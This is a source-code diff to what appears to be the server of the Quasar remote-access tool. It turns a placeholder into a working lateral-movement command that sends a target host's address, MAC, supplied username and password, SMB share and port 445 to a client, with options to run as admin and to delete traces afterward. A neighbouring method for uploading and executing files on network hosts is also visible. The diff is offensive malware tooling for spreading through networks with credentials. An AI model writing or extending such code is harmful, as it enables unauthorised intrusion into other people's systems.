@@ -116,9 +116,19 @@ namespace Quasar.Server.Messages
             _client.Send(new DoNetworkScan { nic = entity });
         }
 
-        public void MoveToEntity(NetworkEntity entity)
+        public void MoveToEntity(NetworkEntity entity, string username, string password, ShareEntity share = null, bool asAdmin = true, bool deleteAfter = true)
         {
-            _client.Send(new DoClientMovement { Address = IPAddress.Parse("127.0.0.1"), AsAdmin = true, DeleteAfter = true, MAC = "", Username = "", Password = "", Port = 445, Share = "" });
+            _client.Send(new DoClientMovement
+            {
+                Address = IPAddress.Parse(entity.Address.Address),
+                AsAdmin = asAdmin,
+                DeleteAfter = deleteAfter,
+                MAC = entity.NIC.MAC,
+                Username = username,
+                Password = password,
+                Port = 445,
+                Share = share != null ? share.ShareName : ""
+            });
         }
 
         public void UploadAndExecte(NetworkEntity entity, string remotePath)
